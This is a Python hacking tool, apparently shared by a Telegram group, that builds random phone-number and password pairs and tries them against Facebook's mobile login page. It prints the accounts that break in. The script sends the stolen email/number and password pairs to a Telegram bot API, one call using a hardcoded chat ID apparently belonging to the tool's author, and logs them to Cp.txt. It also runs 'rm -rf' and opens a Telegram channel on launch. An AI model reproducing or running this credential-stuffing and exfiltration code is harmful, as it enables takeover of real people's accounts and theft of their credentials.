# encoding: utf-8
# Decoded by HackerModePro tool...
# Copyright: PSH-TEAM
# Follow us on telegram ( @psh_team )
import random,webbrowser,os
os.system('rm -rf Begasos')
rr='1234567890'
b= ('077','078','075')
BGreen='[1;36m'
g='[1;37m'
for i in range(10000):
	k=str("".join(random.choice(b)for i in range(1)))
	r=str("".join(random.choice(rr)for i in range(8)))
	n=(k+r)
	with open('Begasos', 'a') as x:
		x.write(n+':'+n+'''
''')

try:
	import os,requests,sys
	from time import sleep 
except ImportError as e:
	sys.exit('[Error] ' + e + ' :-\\')
os.system('rm -rf .txt')

A = "\033[1;91m"
B = "\033[1;90m"
C = "\033[1;97m"
E = "\033[1;92m"
H = "\033[1;93m"
K = "\033[1;94m"
L = "\033[1;95m"

Begasos = """  

\_/﹋\_
 (҂`_´)
 <,︻╦╤─ ҉ - - -BGASOS
 _/﹋\_
@RX999
ALi-ajb
\033[1;91m:......:::....::........:::..:::::..::..:::::..:: 
\033[1;97m--------------------------------------------------
\033[1;97m
 Telegram   : @X_1_6 - @Begasos1
 YOUTUBE    :  بيغاسوس
\033[1;37m
--------------------------------------------------"""  
  

No ="""_/﹋\_
 (҂`_´)
 <,︻╦╤─ ҉ - - -BGASOS
 _/﹋\_
@RX999
ALi-ajb--------------------------------------------------
\033[1;97m
 Telegram CH   : @Begasos1
 YOUTUBE  CH  :بيغاسوس
\033[1;37m
--------------------------------------------------\n                                    
"""                       
webbrowser.open('https://t.me/Begasos1')
def Top(s):
	for ASU in s + '\n':
		sys.stdout.write(ASU)
		sys.stdout.flush()
		sleep(50. / 700)
		sys.exit()
os.system('clear')
r = requests.session()
print (No)
print (A)
TOOLS = input(K+' باسورد: '+C)


if (TOOLS == '169'):
	os.system('clear')
	print(No)
	id4564321987 = input(A+"["+C+"*"+A+"]"+H+ " ID تلجرام:\n"+C)
	file = input(A+"["+C+"*"+A+"]"+H+ " pass كلمة السر :"+C)
	print(E)
	print("-"*50)
	fuck= open(file, 'r')
	
	

	
	
	
	while True:
		user = fuck.readline().split('\n')[0]
		eml = user.split(':')[0]
		pw = user.split(':')[1]
		link = 'https://mobile.facebook.com/login.php'
		data = {
    'email': eml,
    'pass': pw
    }
		headers = {
'User-Agent' : 'Mozilla/5.0 (Linux; Android 4.0.4; Galaxy Nexus Build/IMM76B',
'Accept-Language' : 'en-US,en;q=0.5'
}
		shot = requests.post(link, headers=headers, data=data).text
		if "xc_message" in shot:
			print('\033[1;91m [\033[1;92mHACK - OK\033[1;91m] \033[1;92m%s \033[1;93m-> \033[1;92m %s '%(str(eml), str(pw)))
			r.post(f"https://api.telegram.org/bot1946643739:AAEJuPZyv1ceoZi1Ro_aFGspNXYR71QCCFg/sendMessage?chat_id=1048005193 &text= ⌯  الحساب غير مربوط ⌯\n — — — — —  — — — — — . \n\n.✥. E𝗆𝖺𝗂𝗅  or number : {eml}\n\n.✥. PASS  : {pw}\n\n. — — — — —  — — — — —\n• Tele : @Begasos1 @X_1_6 .")
		elif "checkpointSubmitButton-actual-button" in shot:
			print('\033[1;91m [\033[1;90m10 DAYS - CP\033[1;91m] \033[1;97m%s \033[1;93m-> \033[1;97m %s '%(str(eml), str(pw)))
			r.post(f"https://api.telegram.org/bot1946643739:AAEJuPZyv1ceoZi1Ro_aFGspNXYR71QCCFg/sendMessage?chat_id={id4564321987}&text= ⌯  مرحبا  الحساب يحتاج تأكيد هوية  ⌯\n — — — — —  — — — — — . \n\n.✥. E𝗆𝖺𝗂𝗅 or number {eml}\n\n. ✥. PASS   : {pw}\n\n. — — — — —  — — — — —\n• Tele : @Begasos1 @X_1_6 .")
			with open("Cp.txt",'a') as ff:
				ff.write("Email : "+eml+"\nPass : "+pw+"\n\n")     
				
			
		else:
			print(C+"Email > "+ eml + E +" | "+C+" pass > "+ pw)
			
		